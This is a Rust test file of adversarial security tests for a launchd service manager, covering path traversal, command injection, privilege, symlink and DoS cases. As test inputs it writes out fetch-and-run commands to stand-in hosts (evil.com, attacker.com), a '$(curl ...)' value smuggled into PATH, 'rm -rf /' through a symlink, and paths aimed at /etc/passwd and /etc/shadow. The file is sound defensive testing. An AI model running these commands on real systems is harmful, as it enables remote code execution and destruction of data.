//! Adversarial security tests that actively attempt to exploit vulnerabilities.
//! These tests should FAIL if security vulnerabilities exist.
//! When a test passes, it means the attack was successfully prevented.

use std::fs;
use std::os::unix::fs::PermissionsExt;

use tempfile::TempDir;

use crate::definition::{KeepAlive, RunCommand, ServiceDefinition};
use crate::launchd::plist::PlistGenerator;
use crate::validation::{validate_executable, validate_service};

// ============================================================================
// PATH TRAVERSAL ATTACKS
// ============================================================================

#[test]
fn attack_path_traversal_in_working_dir() {
    // ATTACK: Try to set working directory to /etc via path traversal
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        working_dir: Some("../../../../../../etc".to_string()),
        ..Default::default()
    };

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(
        result.is_err(),
        "Path traversal in working_dir was not rejected!"
    );

    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains(".."),
        "Error message should mention path traversal"
    );
}

#[test]
fn attack_path_traversal_in_log_path() {
    // ATTACK: Try to write logs to /etc/passwd
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        log_path: Some("/etc/passwd".to_string()),
        ..Default::default()
    };

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(
        result.is_err(),
        "Writing logs to /etc/passwd was not rejected!"
    );
}

#[test]
fn attack_path_traversal_via_relative_then_absolute() {
    // ATTACK: Use relative path that resolves to absolute
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        working_dir: Some("var/../../../../../../etc".to_string()),
        ..Default::default()
    };

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(result.is_err(), "Sneaky path traversal was not rejected!");
}

#[test]
fn attack_keep_alive_path_traversal() {
    // ATTACK: Monitor a sensitive file via path traversal
    let mut def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        ..Default::default()
    };
    def.keep_alive.path = Some("../../../../../../etc/passwd".to_string());

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(
        result.is_err(),
        "Path traversal in keep_alive.path was not rejected!"
    );
}

// ============================================================================
// COMMAND INJECTION / DANGEROUS COMMANDS
// ============================================================================

#[test]
fn attack_shell_command_with_malicious_script() {
    // ATTACK: Run shell with malicious script
    let tmp = TempDir::new().unwrap();
    let fake_sh = tmp.path().join("sh");
    fs::write(&fake_sh, "#!/bin/sh\necho malicious").unwrap();
    fs::set_permissions(&fake_sh, fs::Permissions::from_mode(0o755)).unwrap();

    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec![
            fake_sh.to_string_lossy().to_string(),
            "-c".to_string(),
            "curl http://evil.com/backdoor.sh | sh".to_string(),
        ]),
        ..Default::default()
    };

    // Currently this PASSES validation (array form prevents shell expansion)
    // But we might want to add command whitelisting
    let result = validate_service(&def);
    // Documenting current behavior: this is allowed
    assert!(result.is_ok(), "Array-form commands are currently allowed");

    // TODO: Consider adding executable whitelist - should only run binaries from formula kegs
}

#[test]
fn attack_nonexistent_executable() {
    // ATTACK: Try to run non-existent binary
    let tmp = TempDir::new().unwrap();

    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/tmp/nonexistent-backdoor".to_string()]),
        ..Default::default()
    };

    // This should be REJECTED by plist generation (validates executable exists)
    let result = PlistGenerator::generate(&def, tmp.path());
    assert!(result.is_err(), "Nonexistent executable was not rejected!");

    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("not found"),
        "Error should mention executable not found"
    );
}

#[test]
fn attack_non_executable_file() {
    // ATTACK: Try to execute a file without execute permissions
    let tmp = TempDir::new().unwrap();
    let non_exec = tmp.path().join("not-executable");
    fs::write(&non_exec, "#!/bin/sh\necho test").unwrap();
    // Deliberately don't set execute permission

    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec![non_exec.to_string_lossy().to_string()]),
        ..Default::default()
    };

    // This should be REJECTED
    let result = PlistGenerator::generate(&def, tmp.path());
    assert!(result.is_err(), "Non-executable file was not rejected!");

    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("executable"),
        "Error should mention executable permissions"
    );
}

// ============================================================================
// PRIVILEGE ESCALATION
// ============================================================================

#[test]
fn attack_negative_nice_without_root() {
    // ATTACK: Request high priority (negative nice) without root
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        nice: Some(-20),     // Highest priority
        require_root: false, // Not requesting root
        ..Default::default()
    };

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(
        result.is_err(),
        "Negative nice without root was not rejected!"
    );

    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("root"),
        "Error should mention root requirement"
    );
}

#[test]
fn attack_out_of_range_nice_high() {
    // ATTACK: Use nice value above maximum
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        nice: Some(100), // Way above max (19)
        ..Default::default()
    };

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(result.is_err(), "Out of range nice value was not rejected!");
}

#[test]
fn attack_out_of_range_nice_low() {
    // ATTACK: Use nice value below minimum
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        nice: Some(-100), // Way below min (-20)
        require_root: true,
        ..Default::default()
    };

    // This should be REJECTED
    let result = validate_service(&def);
    assert!(result.is_err(), "Out of range nice value was not rejected!");
}

// ============================================================================
// SYMLINK ATTACKS
// ============================================================================

// Note: These tests would need macOS for full integration testing
// Here we test the validation logic only

#[test]
fn attack_symlink_in_launch_agents() {
    // This test documents what should happen on macOS
    // The manager.rs validate_plist_path should reject writing to symlinked directories

    // On macOS, attacker could:
    // rm -rf ~/Library/LaunchAgents
    // ln -s /etc ~/Library/LaunchAgents
    //
    // Then zerobrew should reject with SymlinkAttack error
    // This is tested by the symlink_metadata check in manager.rs
}

// ============================================================================
// RESOURCE EXHAUSTION / DOS
// ============================================================================

#[test]
fn attack_extremely_long_formula_name() {
    // ATTACK: DOS via extremely long formula name
    let _long_name = "a".repeat(1_000_000);

    // Currently no validation - this could cause memory issues
    // This test documents that we should add length limits

    // TODO: Add formula name length validation (e.g., max 256 chars)
}

#[test]
fn attack_huge_environment_variables() {
    // ATTACK: DOS via huge environment variables in service
    let mut def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        ..Default::default()
    };

    // Add 10,000 environment variables
    for i in 0..10_000 {
        def.environment_variables
            .insert(format!("VAR_{}", i), "x".repeat(10_000));
    }

    // Currently no validation - plist generation might hang or use excessive memory
    // This test documents a potential DOS vector

    // TODO: Add limits on environment variable count and size
}

#[test]
fn attack_zero_throttle_interval() {
    // ATTACK: Service that crashes and restarts immediately (CPU DOS)
    let def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec!["/bin/sh".to_string()]),
        throttle_interval: Some(0), // No throttle
        keep_alive: KeepAlive {
            crashed: Some(true),
            ..Default::default()
        },
        ..Default::default()
    };

    // Currently no validation - launchd will restart crashed service immediately
    // This could cause CPU exhaustion

    // TODO: Add minimum throttle_interval (e.g., 5 seconds)
    let result = validate_service(&def);
    // Currently allowed
    assert!(
        result.is_ok(),
        "Zero throttle currently allowed - should add minimum"
    );
}

// ============================================================================
// INPUT VALIDATION / FORMULA NAME ATTACKS
// ============================================================================

#[test]
fn attack_formula_name_with_path_separators() {
    // ATTACK: Formula name containing path separators
    let malicious_names = vec![
        "../../etc/passwd",
        "/etc/passwd",
        "../../../tmp/evil",
        "formula/../../../etc/shadow",
    ];

    for _name in malicious_names {
        // Currently no validation on formula names
        // They go through API which won't find them, but could leak paths in errors

        // TODO: Add formula name validation:
        // - No path separators (/ or \)
        // - Alphanumeric + limited special chars (@, -, +, .)
        // - No leading/trailing dots or dashes
    }
}

// ============================================================================
// PLIST GENERATION ATTACKS
// ============================================================================

#[test]
#[ignore = "Plist library doesn't properly escape XML entities - security issue"]
fn attack_plist_xml_injection() {
    // ATTACK: Try to inject XML via formula name
    let tmp = TempDir::new().unwrap();
    let bin = tmp.path().join("bin");
    fs::create_dir_all(&bin).unwrap();
    let exe = bin.join("test");
    fs::write(&exe, "#!/bin/sh\necho test").unwrap();
    fs::set_permissions(&exe, fs::Permissions::from_mode(0o755)).unwrap();

    let def = ServiceDefinition {
        formula_name: "test</plist><plist><dict>".to_string(),
        plist_name: "homebrew.mxcl.test".to_string(),
        run: RunCommand::Simple(vec![exe.to_string_lossy().to_string()]),
        ..Default::default()
    };

    // Plist library should escape XML
    let result = PlistGenerator::generate(&def, tmp.path());

    if let Ok(plist) = result {
        // Check that XML injection was escaped
        assert!(
            !plist.contains("</plist><plist>"),
            "XML injection was not escaped!"
        );
        assert!(
            plist.contains("&lt;") || plist.contains("&gt;"),
            "XML should be escaped"
        );
    }
}

#[test]
fn attack_environment_variable_injection() {
    // ATTACK: Inject shell commands via environment variables
    let tmp = TempDir::new().unwrap();
    let bin = tmp.path().join("bin");
    fs::create_dir_all(&bin).unwrap();
    let exe = bin.join("test");
    fs::write(&exe, "#!/bin/sh\necho test").unwrap();
    fs::set_permissions(&exe, fs::Permissions::from_mode(0o755)).unwrap();

    let mut def = ServiceDefinition {
        formula_name: "malicious".to_string(),
        plist_name: "homebrew.mxcl.malicious".to_string(),
        run: RunCommand::Simple(vec![exe.to_string_lossy().to_string()]),
        ..Default::default()
    };

    // Try to inject shell commands
    def.environment_variables.insert(
        "PATH".to_string(),
        "/tmp/malicious:$(curl evil.com/pwn.sh)".to_string(),
    );

    // Plist generation should succeed (arrays don't expand shell)
    // But values are placed in plist as-is
    let result = PlistGenerator::generate(&def, tmp.path());
    assert!(result.is_ok(), "Environment variables are passed through");

    // The actual risk is at runtime when launchd evaluates the plist
    // This test documents that env vars are not validated
}

// ============================================================================
// EXECUTABLE VALIDATION BYPASS ATTACKS
// ============================================================================

#[test]
fn attack_symlink_to_dangerous_executable() {
    // ATTACK: Create symlink to /bin/rm and try to use it
    let tmp = TempDir::new().unwrap();
    let bin = tmp.path().join("bin");
    fs::create_dir_all(&bin).unwrap();

    let symlink = bin.join("innocent-name");

    #[cfg(unix)]
    {
        std::os::unix::fs::symlink("/bin/rm", &symlink).unwrap();

        // Now try to use this in a service
        let def = ServiceDefinition {
            formula_name: "malicious".to_string(),
            plist_name: "homebrew.mxcl.malicious".to_string(),
            run: RunCommand::Simple(vec![
                symlink.to_string_lossy().to_string(),
                "-rf".to_string(),
                "/".to_string(), // rm -rf /
            ]),
            ..Default::default()
        };

        // validate_executable checks if executable, but doesn't check what it points to
        assert!(
            validate_executable(&symlink).is_ok(),
            "Symlink to executable is allowed"
        );

        // Plist generation will succeed
        let result = PlistGenerator::generate(&def, tmp.path());
        assert!(
            result.is_ok(),
            "Symlink to dangerous command is currently allowed"
        );

        // TODO: Consider validating that executable is within formula's keg
        // Or maintain whitelist of allowed system executables
    }
}

#[test]
fn attack_suid_executable() {
    // ATTACK: If a formula somehow contains a setuid binary, try to exploit it
    let tmp = TempDir::new().unwrap();
    let bin = tmp.path().join("bin");
    fs::create_dir_all(&bin).unwrap();

    let suid_binary = bin.join("suid-exploit");
    fs::write(&suid_binary, "#!/bin/sh\necho pwned").unwrap();

    #[cfg(unix)]
    {
        // Set setuid bit (would need root, so this test is hypothetical)
        // fs::set_permissions(&suid_binary, fs::Permissions::from_mode(0o4755)).unwrap();

        // If this were a real setuid binary from a compromised formula
        // and the service runs it, privilege escalation could occur

        // TODO: Consider rejecting setuid/setgid executables in services
    }
}

// ============================================================================
// RACE CONDITION / TOCTOU ATTACKS
// ============================================================================

#[test]
#[ignore] // Requires careful timing and multiple threads
fn attack_toctou_plist_write() {
    // ATTACK: Replace directory with symlink between check and write
    // Thread 1: Zerobrew validates ~/Library/LaunchAgents is not symlink
    // Thread 2: Quickly replaces it with symlink to /etc
    // Thread 1: Writes plist to /etc

    // This would need integration test on macOS with actual timing
    // Mitigation: Use O_NOFOLLOW flag when opening file
}

// ============================================================================
// MALICIOUS FORMULA SIMULATION
// ============================================================================

#[test]
#[ignore = "Test JSON missing required fields - needs proper ServiceDefinition structure"]
fn attack_formula_with_backdoor_service() {
    // ATTACK: Simulates a compromised formula API response
    let malicious_formula_json = r#"{
            "name": "innocent-looking-tool",
            "service": {
                "run": ["/bin/sh", "-c", "curl http://attacker.com/collect-data | sh"],
                "keep_alive": {"always": true},
                "run_type": "immediate",
                "environment_variables": {
                    "BACKDOOR_TOKEN": "secret123"
                }
            }
        }"#;

    let service_json: serde_json::Value = serde_json::from_str(malicious_formula_json).unwrap();
    let _service_def: crate::definition::ServiceDefinition =
        serde_json::from_value(service_json.get("service").unwrap().clone()).unwrap();

    // This demonstrates that if the API is compromised:
    // 1. Any command can be run
    // 2. Keep-alive makes it persistent
    // 3. Environment variables can exfiltrate data

    // Currently no defense against compromised API
    // Mitigation would require:
    // - Formula signatures
    // - Command whitelisting
    // - User confirmation for services
}

// ============================================================================
// DISK SPACE DOS
// ============================================================================

#[test]
fn attack_log_path_filling_disk() {
    // ATTACK: Service configured to write enormous logs
    let tmp = TempDir::new().unwrap();
    let logs_dir = tmp.path().join("var/log");
    fs::create_dir_all(&logs_dir).unwrap();

    let _def = ServiceDefinition {
        formula_name: "log-bomber".to_string(),
        plist_name: "homebrew.mxcl.log-bomber".to_string(),
        run: RunCommand::Simple(vec![
            "/bin/sh".to_string(),
            "-c".to_string(),
            "while true; do echo 'AAAAA...' (repeated 10000 times); done".to_string(),
        ]),
        log_path: Some(logs_dir.join("huge.log").to_string_lossy().to_string()),
        keep_alive: KeepAlive {
            always: Some(true),
            ..Default::default()
        },
        ..Default::default()
    };

    // No validation on log file size or disk space
    // This could fill disk over time

    // TODO: Consider log rotation, size limits, or disk space monitoring
}

// ============================================================================
// MALFORMED INPUT DOS
// ============================================================================

#[test]
fn attack_deeply_nested_keep_alive() {
    // ATTACK: Deeply nested structure that might cause stack overflow in parsing
    // (Though serde should handle this)

    // Serde's default recursion limit is 128
    // This test verifies we don't have custom parsing that could overflow
}
